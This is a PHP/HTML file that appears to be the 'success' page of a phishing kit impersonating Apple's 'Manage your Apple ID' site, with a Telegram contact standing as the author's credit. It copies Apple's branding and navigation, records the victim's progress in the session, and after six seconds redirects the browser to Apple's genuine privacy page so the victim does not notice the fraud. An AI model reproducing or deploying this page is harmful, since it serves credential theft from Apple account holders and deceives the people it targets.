<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "success";
    $semantic = semantic();
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../../media/imgs/ff.ico" />

        <title>Manage your Apple ID</title>
    </head>

    <body>

        <div class="wrapper">
        <div class="max-h-890">
            <div class="a-nvbr">

                <div class="nav-con">
                    <ul>
                        <li>
                            <a href="#" class="__link __logo__"></a>
                        </li>
                        <li>
                            <a href="" class="__link"><?php echo get_text('menu1'); ?></a>
                        </li>
                        <li><a href="" class="__link"><?php echo get_text('menu2'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu3'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu4'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu5'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu6'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu7'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu8'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu9'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu10'); ?></a></li>
                        <li>
                            <a href="#" class="__link search"></a>
                        </li>
                        <li>
                            <a href="#" class="__link shp-ico"></a>
                        </li>
                    </ul>

                    <div class="hum">
                        <img src="../media/imgs/hamburger.png" alt="">
                    </div>

                    <div class="logo__container"><img src="../media/imgs/apple.svg" alt=""></div>

                    <div class="shop">
                        <img src="../media/imgs/shop.svg" alt="">
                    </div>

                </div>

            </div>
            <div class="con-cus">
                <div class="head">
                    <div class="hd-wrp">
                        <a href="#" class="_apple_link"><?php echo get_text('apple_id'); ?></a>
                        <ul class="applehd-items">
                            <li class="apple-h-it">
                                <span class="hdap-link current-link"><?php echo get_text('smenu1'); ?></span>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu2'); ?></a>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu3'); ?></a>
                            </li>
                        </ul>

                        <div class="arrow-down">
                            <img src="../media/imgs/arrow-down.png" alt="">
                        </div>
                    </div>
                </div>
                <div class="content-wrap">
                    <div class="success">
                        <img class="image" src="../media/imgs/success.png">
                        <h3 class="title"><?php echo get_text('success_title'); ?></h3>
                        <p><?php echo get_text('success_text'); ?></p>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="fot-cntr">
                <p>
                    <?php echo get_text('footer_text'); ?>
                </p>
                <div class="d-flex align-items-center copyright">
                    <div class="d-flex align-items-center sub-copy">
                        <p>
                            <?php echo get_text('copyright'); ?>
                        </p>
                        <ul>
                            <li>
                                <?php echo get_text('footer1'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer2'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer3'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer4'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer5'); ?>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>
        </div>
    </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script type="text/javascript">
            setTimeout(function () {
                window.location.href= 'https://www.apple.com/legal/privacy/';
            },6000); // 1000 = 1s
        </script>

    </body>

</html>